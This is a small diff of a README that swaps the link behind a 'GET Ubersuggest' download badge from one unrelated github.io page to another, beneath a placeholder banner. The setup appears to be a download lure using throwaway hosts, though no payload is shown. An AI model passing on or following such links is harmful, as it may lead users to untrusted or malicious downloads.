@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=4ee277915862d4c3b7370830aa462f3d189c22a3-9858735-images-thumbs&n=13)
 
-[![GET Ubersuggest](https://img.shields.io/badge/GET%20%E2%80%94%20Ubersuggest-0078D6?style=for-the-badge&logoColor=white)](https://component-store-cleanup-tools.github.io/.github/ubersuggest-ai)
+[![GET Ubersuggest](https://img.shields.io/badge/GET%20%E2%80%94%20Ubersuggest-0078D6?style=for-the-badge&logoColor=white)](https://samhornwfpv.github.io/.github/ubersuggest-ai)
 
 ---
 
